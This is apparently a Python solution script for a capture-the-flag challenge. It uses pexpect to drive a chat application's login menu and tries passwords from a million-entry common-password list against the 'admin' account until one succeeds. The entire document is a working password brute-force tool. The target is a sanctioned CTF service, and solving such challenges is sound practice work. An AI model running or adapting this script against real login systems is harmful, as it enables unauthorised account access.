import pexpect
from tqdm import tqdm

# Define the target and username
target = "./sc nopsctf-863b9c9f23bb-jojo_chat_v1-0.chals.io"
username = "admin"

# Read the password list from a file
def read_passwords(file_path):
    with open(file_path, 'r', encoding='latin-1') as file:  # Use encoding 'latin-1' to handle special characters
        passwords = file.read().splitlines()
    return passwords

# Brute force login function
def brute_force_login(target, username, password_list):
    for password in tqdm(password_list, desc="Brute Forcing"):
        # Start the application
        child = pexpect.spawn(target)

        # Interact with the application
        child.expect("Choose an option:")
        child.sendline("2")
        child.expect("Username:")
        child.sendline(username)
        child.expect("Password:")
        child.sendline(password)

        # Check the response
        index = child.expect(["Incorrect password!", "Choose an option:", pexpect.EOF, pexpect.TIMEOUT], timeout=5)

        if index == 1:
            print(f"\nPassword found: {password}")
            return password

        child.sendline("3")  # Exit after a failed attempt

    print("\nPassword not found in the provided list.")
    return None

# File path to the password list
password_file = '/home/mc4minta/min-ctf/N0PSctf/jojo12/10-million-password-list-top-1000000.txt'
password_list = read_passwords(password_file)

# Call the function to brute force the login
brute_force_login(target, username, password_list)
